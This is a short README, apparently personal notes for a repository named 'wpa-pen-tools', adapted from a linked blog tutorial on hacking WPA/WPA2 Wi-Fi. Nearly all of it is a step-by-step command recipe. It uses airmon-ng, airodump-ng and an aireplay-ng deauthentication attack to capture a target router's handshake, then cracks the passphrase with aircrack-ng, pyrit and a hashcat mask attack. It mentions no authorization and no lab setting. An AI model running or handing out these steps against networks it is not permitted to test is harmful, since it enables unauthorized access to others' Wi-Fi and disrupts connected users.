# wpa-pen-tools

Based on [this](http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html) howto

## Extract handshake (in kali)
* airmon-ng start wlan0
* airodump-ng wlan0mon
* airodump-ng -c 1,1 --bssid {target_router_bssid} -w /mnt/mon0 wlan0mon
* aireplay-ng -0 2 -a {target_router_bssid} -c {connected_station_bssid} wlan0mon
* airmon-ng stop wlan0mon

## Crack password

### aircrack-ng
* aircrack-ng -a2 -b {target_router_bssid} -w /mnt/wordlist.txt /mnt/*.cap

### pyrit
* pyrit -r mon0-01.cap analyze
* pyrit -u sqlite:///mydb.db -i wordlist.txt import_passwords
* pyrit -u sqlite:///mydb.db -e {attacked_network_name} create_essid
* #pyrit eval
* pyrit -u sqlite:///mydb.db batch
* pyrit -u sqlite:///mydb.db -r *.cap attack_db

### hashcat
#### Prepare outfile (in kali):
* wpaclean out.cap mon0-01.cap
* aircrack-ng out.cap -J out

#### in hashcat:
* hashcat -m 2500 -a 3 out.hccap '?d?d?d?d?d?d?d?d'
